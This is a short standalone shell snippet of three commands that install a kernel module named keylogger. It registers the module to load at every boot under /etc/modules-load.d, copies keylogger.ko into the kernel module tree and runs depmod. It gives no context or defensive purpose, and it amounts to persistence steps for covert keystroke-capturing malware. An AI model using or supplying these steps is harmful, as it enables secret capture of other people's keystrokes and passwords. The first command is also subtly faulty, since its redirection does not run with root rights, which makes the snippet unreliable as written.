sudo echo "keylogger" > /etc/modules-load.d/keylogger.conf
sudo cp ./keylogger.ko /lib/modules/`uname -r`/kernel/keylogger.ko
sudo depmod